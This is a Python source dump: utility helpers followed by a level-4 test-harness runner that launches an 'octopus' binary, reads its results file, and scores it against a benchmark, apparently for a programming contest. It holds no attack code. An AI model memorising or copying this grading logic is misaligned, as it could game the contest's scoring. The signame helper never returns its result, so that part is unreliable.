                "Stripe requires a JSON library with the same interface as "
                "the Python 2.6 'json' library.  You appear to have a 'json' "
                "library with a different interface.  Please install "
                "the simplejson library.  HINT: Try installing the "
                "python simplejson library via 'pip install simplejson' "
                "or 'easy_install simplejson'.")


def utf8(value):
    if sys.version_info < (3, 0) and isinstance(value, unicode):
        return value.encode('utf-8')
    else:
        return value

def random_letters(count=4):
    LETTERS = "abcdefghijklmnopqrstuvwxyz"
    output = []
    for i in range(0, count):
        output.append(SystemRandom().choice(LETTERS))
    return "".join(output)

# TODO: Python >2.5 ?
def mkdir_p(path):
    try:
        os.makedirs(path)
    except OSError:
        if os.path.isdir(path): pass
        else: raise

def exception_as():
    _, err, _ = sys.exc_info()
    return err

########NEW FILE########
__FILENAME__ = runner
import os.path
import subprocess
import time
import signal

# From this package
import lib.error as error
import lib.util as util
import lib.test_framework as test_framework

class Runner(test_framework.AbstractRunner):
    LEVEL = 4
    DURATION = "30s"
    OPEN_CUT = '-' * 20 + '8<' + '-' * 20
    CLOSE_CUT = '-' * 20 + '>8' + '-' * 20

    def __init__(self, options):
        # self.results_path = os.path.join(test_framework.data_directory, "results.json")
        self.results_path = "/tmp/octopus/results.json"
        super(Runner, self).__init__(options)

    def signame(self, signum):
        sigmap = dict((k, v) for v, k in signal.__dict__.iteritems() if v.startswith('SIG'))
        sigmap[signum]

    def run_input(self, input):
        # Make sure results file is absent
        try:
            os.remove(self.results_path)
        except OSError:
            pass

        util.logger.info("Beginning run.")
        try:
            # TODO: handle non-zero return codes here better
            octopus = subprocess.Popen(["./octopus", "--seed", str(input), "-w", self.results_path, "-duration", str(self.DURATION)], cwd=os.path.dirname(__file__))
        except OSError as e:
            raise Exception("Experienced an error trying to run Octopus: %s. (Hint: try removing `test/data/octopus.version` and running the harness again.)" % (e, ))

        start_time = time.time()
        octopus.communicate()
        end_time = time.time()

        try:
            f = open(self.results_path)
            results = f.read()
            f.close()
        except IOError:
            results = None
        else:
            results = util.json.loads(results)

        if octopus.returncode >= 0:
            exitstatus = octopus.returncode
            termsig = None
        else:
            exitstatus = None
            termsig = octopus.returncode

        util.logger.info("Finished run")
        return {
            "wall_clock_time": end_time - start_time,
            "input": input,
            "level": self.LEVEL,
            "exitstatus": exitstatus,
            "termsig": termsig,
            "raw_results": results,
        }

    def net_score(self, your_total, benchmark_total):
        total_ratio = (your_total + 0.0) / benchmark_total * 100
        return max(int(round(total_ratio)), 0)

    def report_result(self, test_case, result):
        exitstatus = result["exitstatus"]
        termsig = result["termsig"]

        your_results = result["raw_results"]
        benchmark_results = test_case["raw_results"]

        if exitstatus:
            util.logger.info("Octopus exited with status %d. This isn't expected. (The output above should indicate what actually went wrong.)" % (exitstatus, ))
        elif termsig:
            name = self.signame(termsig)
            util.logger.info("Octopus was terminated by signal %s [signal number %d]. That was presumably something you did manually?" % (name, termsig))

        if your_results:
            your_total = your_results["Total"]
            benchmark_total = benchmark_results["Total"]
            score = self.net_score(your_total, benchmark_total)

            util.logger.info("".join(
                [self.OPEN_CUT, "\n", your_results["Pretty"], self.CLOSE_CUT]
            ))

            disqualifier = your_results["Disqualifier"]
            if not disqualifier:
                if your_total < 0:
                    util.logger.info("Your normalized score works out to %d (we cap at zero). For reference, our benchmark scored %d [queries] - %d [network] = %d points on this test case." % (score, benchmark_results["QueryPoints"], benchmark_results["BytePoints"], benchmark_results["Total"]))
                else:
                    util.logger.info("Your normalized score works out to %d. (Our benchmark scored %d [queries] - %d [network] = %d points on this test case.)" % (score, benchmark_results["QueryPoints"], abs(benchmark_results["BytePoints"]), benchmark_results["Total"]))
        else:
            pass # dqd

########NEW FILE########
